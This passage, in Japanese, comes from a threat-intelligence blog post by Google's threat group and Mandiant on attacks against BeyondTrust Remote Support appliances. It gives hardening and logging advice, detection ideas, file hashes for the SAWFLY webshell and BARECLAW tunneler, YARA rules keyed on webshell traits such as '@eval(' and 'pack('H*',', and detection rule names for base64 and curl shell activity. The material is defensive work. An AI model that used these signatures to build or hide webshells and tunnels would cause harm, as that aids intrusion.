baseline;\">/login</code><span style=\"vertical-align: baseline;\"> ユーザーに、フィッシング耐性のある MFA を使用した SAML シングル サインオンを必須とします。また、ローカル アカウントは、Vault に保存され、使用時にアラートが発生する、ブレークグラス アカウント 1 つを除いて削除します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">組み込みの管理者アカウントについては、公式の</span><a href=\"https://docs.beyondtrust.com/rs/docs/two-factor-authentication#activate-two-factor-authentication\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">BeyondTrust 2 要素認証ガイドライン</span></a><span style=\"vertical-align: baseline;\">に沿って多要素認証（MFA）が構成されていることを確認します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">すべてのグループ ポリシーで、Jump Item のデフォルトのロールを「No Access」（アクセスなし）に設定し、ユーザーごとではなくポリシーを通じてロールを付与します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">API アカウントのスコープを最小限の権限セットに設定し、ユーザーまたは Jump Item の管理権限を持つアカウントには自動化の所有者を指名します。また、API シークレットはスケジュールに沿ってローテーションします。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">特権認証情報は、Remote Support Vault ではなく、認証情報インジェクションを使用する Password Safe または外部 Vault に保管します。アプライアンスには、非対話型サービス アカウントの認証情報のみを保存します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">アプライアンスからのアウトバウンド トラフィックにデフォルト拒否のフィルタリングを適用し、BeyondTrust のエンドポイントおよび組織独自の syslog サーバーとディレクトリ サーバーのみを許可します。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">パート D: ロギングと検出エンジニアリング</strong></p>\n<p><strong style=\"vertical-align: baseline;\">ロギングと可視性</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">アプライアンスの syslog を TLS 経由で SIEM に転送し、数か月にわたる露出期間をカバーする保持期間を設定します。また、アプライアンスのアドレスのリバース プロキシまたは WAF と境界ファイアウォールのログを収集します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">/login</code><span style=\"vertical-align: baseline;\"> セッション、チーム アクティビティ、ユーザー監査レポートをスケジュールに沿ってエクスポートします。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">検出エンジニアリング</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">アカウントとポリシーの変更</strong><span style=\"vertical-align: baseline;\">: Jump Item またはチームロールを昇格させる </span><code style=\"vertical-align: baseline;\">user_changed</code><span style=\"vertical-align: baseline;\"> イベント、変更チケットのない </span><code style=\"vertical-align: baseline;\">user_added</code><span style=\"vertical-align: baseline;\"> イベント、</span><code style=\"vertical-align: baseline;\">api_account</code><span style=\"vertical-align: baseline;\"> イベント、</span><code style=\"vertical-align: baseline;\">security_provider</code><span style=\"vertical-align: baseline;\"> イベント、アウトバウンド イベントまたは syslog 宛先の変更。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">認証</strong><span style=\"vertical-align: baseline;\">: 家庭向けブロードバンドまたは商用 VPN アドレス空間からの </span><code style=\"vertical-align: baseline;\">/login</code><span style=\"vertical-align: baseline;\"> の成功、営業時間外の管理者ログイン。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">セッション アクティビティ</strong><span style=\"vertical-align: baseline;\">: ファイル転送イベント、対象期間中にロールが変更されたアカウントによって開始されたセッション。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">リクエストパス</strong><span style=\"vertical-align: baseline;\">: リバース プロキシまたは WAF で、Remote Support の既知のパスセット外のパス（不明な .php パス、サポート スタッフやエンドポイントのアドレス範囲外からの WebSocket アップグレードなど）。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">フォレンジック対策:</strong><span style=\"vertical-align: baseline;\"> アプライアンスからの syslog 転送におけるギャップ。1 つのセッションに限定された中断は、ログの改ざんを強く示唆します。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">セキュリティ侵害インジケーター（IoC）</strong></p>\n<p><span style=\"vertical-align: baseline;\">このブログ投稿で説明した活動の検出と特定に役立てていただくため、登録ユーザー向けの</span><a href=\"https://www.virustotal.com/gui/collection/194e0cb2a231aaf8e6b4bee93437c85b434dda7e327a5f483b79f7ff5bfcaa5e\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">GTI コレクション</span></a><span style=\"vertical-align: baseline;\">にセキュリティ侵害インジケーター（IoC）を含めました。</span></p>\n<p><span style=\"vertical-align: baseline;\">ファイル インジケーター</span></p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ファイル名</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">説明</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">SHA-256</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">app_84304470%2Ephp</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ステージング用のウェブシェル</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">該当なし</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">mangoapi.php</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">SAWFLY ウェブシェル</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">dc14e215269a93fdbc4c1a80b984c23faf7af0911c6dbb85309796a6f2ae95fb</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ingredi_ws</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">BARECLAW トンネラー</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">1f19b9a27d79c11bda00a1e8faf74a7fdd683d38ccef1b60df2fd0307e3aa462</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n<p> </p></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">検出</strong></p>\n<p><span style=\"vertical-align: baseline;\">YARA ルール</span></p>\n<pre class=\"language-markup\"><code>rule G_Hunting_Webshell_SAWFLY_1 {\n  meta:\nauthor = \"Google Threat Intelligence Group\"    \n  strings:\n    $b32 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\" ascii wide\n    $rc4 = \"range(0,255)\" ascii wide\n    $pack = \"pack('H*',\" ascii wide\n    $eval = \"@eval(\" ascii wide\n    $code404 = \"http_response_code(404)\" ascii wide\n  condition:\n    filesize &lt; 20KB and\n    all of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>rule G_Hunting_Backdoor_BARECLAW_1 {\n  meta:\n    author = \"Google Threat Intelligence Group\"\n\n  strings:\n    $s1 = \"[%s ws_socks5d] \" ascii wide\n    $s2 = \"--obfs requires --token\" ascii wide\n    $s3 = \"mux: %s (frame[%lu]: %s)\" ascii wide\n    $s4 = \"cannot create stream pump/writer thread (stream %d)\" ascii wide\n    $s5 = \"reject: bad or missing token from %s\" ascii wide\n    $s6 = \"listening on %s path=%s (token=%s obfs=%s max_tunnels=%d threads=%d)\" ascii wide\n    $s7 = \"--ws-path must start with '/'\" ascii wide\n    $b_xorshift = { 48 c1 e0 17 48 31 c1 48 89 f0 48 c1 e8 1a 48 31 f0 48 31 c8 48 c1 e9 11 48 31 c8 }\n  condition:\n    uint32(0) == 0x464c457f and (5 of ($s*)) or ($b_xorshift and (3 of ($s*)))\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Google Security Operations（SecOps）</strong></p>\n<p><span style=\"vertical-align: baseline;\">Google SecOps をご利用のお客様は、Mandiant Hunting、Mandiant Frontline Threats、Mandiant Intel Emerging Threats の各ルールパックで、これらの幅広いカテゴリのルールやその他のルールをご利用いただけます。このブログ投稿で取り上げた活動は、Google SecOps において以下のルール名で検出されています。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Echo Pipes Base64 To Shell</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Base64 Encoded Shell Command Execution</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Low Severity Endpoint Detection Cluster on Host</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Curl Download to tmp</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Curl Network Connection to Staging Directory</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">謝辞</strong></p>\n<p><span style=\"vertical-align: baseline;\">この脅威への対応における BeyondTrust のご協力に感謝いたします。</span></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">- Google Threat Intelligence Group</strong></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">- Mandiant</strong></p></div>"
